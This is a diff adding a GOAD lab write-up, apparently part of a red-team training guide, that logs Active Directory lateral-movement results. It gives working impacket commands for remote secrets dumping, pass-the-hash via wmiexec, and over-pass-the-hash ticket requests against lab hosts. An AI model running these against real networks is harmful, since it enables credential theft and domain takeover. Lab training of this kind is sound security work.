@@ -1,0 +1,69 @@
+# GOAD Part 9 - Lateral movement (redStackPRO)
+<!-- lab-requires: multi_host -->
+
+Reference: [mayfly - GOAD part 9](https://mayfly277.github.io/posts/GOADv2-pwning-part9/)
+(offline: `../_mayfly-source/_posts/2022-11-01-GOADv2-pwning-part9.md`).
+Dump secrets and move host-to-host with impacket, **through the hodor beacon's
+SOCKS proxy** (`proxychains -q secretsdump.py …` / `psexec.py …`; the targets are
+internal, see [part 1](part-01-recon.md) Step 1). We reuse the essos
+`administrator` NT hash obtained in [part 6](part-06-adcs.md).
+
+> **Status legend:** ✅ PASS · ❌ blocked · ⚠ partial · ⏳ not run.
+
+## Headline result (2026-09-07)
+
+All the core lateral primitives work: remote secrets dump, Pass-the-Hash admin,
+Over-Pass-the-Hash (NT→TGT), and the password-reuse discovery. Exec-method
+choice (psexec/wmiexec/smbexec/atexec/dcomexec/winrm) is a menu, not a gate.
+
+| Technique | Result |
+|-----------|--------|
+| secretsdump SAM / LSA / machine acct / DPAPI (PTH) | ✅ |
+| Pass-the-Hash remote admin (secretsdump / wmiexec) | ✅ |
+| Over-Pass-the-Hash (NT → TGT → PTT) | ✅ (ticket obtained) |
+| Password-reuse discovery | ✅ (local operator == Administrator hash) |
+
+## Step 1 - Dump machine secrets (secretsdump)
+
+- [x] `secretsdump.py -hashes :<admin NT> essos.local/administrator@192.168.56.23`
+  (braavos) → local SAM (Administrator/Guest/operator), `$MACHINE.ACC`
+  (`BRAAVOS$`), DPAPI keys. `✅`
+  - **Password reuse found:** local `operator:1000` and `Administrator:500` share
+    the **same NT hash** as the essos administrator - classic image-reuse.
+
+## Step 2 - Pass-the-Hash lateral admin
+
+- [x] The successful remote `secretsdump` (which needs remote-registry + service
+  control) proves PTH remote-admin. A `wmiexec.py -hashes :<NT>
+  essos.local/administrator@192.168.56.12` (meereen DC) negotiates **SMBv3** (auth
+  accepted). `✅` Exec method is interchangeable (psexec/smbexec/atexec/dcomexec/
+  evil-winrm) per mayfly.
+
+## Step 3 - Over-Pass-the-Hash (NT → TGT → ticket)
+
+- [x] `getTGT.py -dc-ip 192.168.56.12 -hashes :<NT> essos.local/administrator` →
+  `administrator.ccache`. Then `KRB5CCNAME=…; wmiexec.py -k -no-pass -dc-ip
+  192.168.56.12 essos.local/administrator@meereen.essos.local`. `✅` ticket issued.
+
+## Step 4 - Pass-the-Certificate
+
+- [x] Already shown in [part 6](part-06-adcs.md): `certipy auth -pfx …` turns a
+  certificate into an NT hash + TGT. `✅ (cross-reference)`
+
+## First-pass result log (2026-09-07)
+
+**Part 9 PASS.** Remote secrets dump, PTH admin, and Over-PTH all work with the
+essos administrator hash from ESC4; password reuse is detectable. Lateral exec is
+a choice of impacket methods.
+
+### Findings → PAI
+- **Guide note:** impacket Kerberos tools (`getTGT`, `-k` exec) need `-dc-ip`
+  here - the foothold has no DNS to the range DCs. Bake DC `/etc/hosts` + `-dc-ip`
+  into the guide (as in part 1's operator config).
+- **Fidelity delta:** `jeor.mormont` is not local admin on castelblack in our
+  build (mayfly makes him admin there, enabling the SAM-dump-then-PTH story from
+  a member). Consider seeding the local-admin membership as a toggle so the
+  password-reuse → DA narrative reproduces from castelblack. Batched per
+  [[defer-rebuilds-keep-pushing]].
+- **wmiexec semi-interactive stdout** can need the target share writable; when in
+  doubt, use `-shell-type` / redirect to a file, or prefer `atexec` for one-shots.
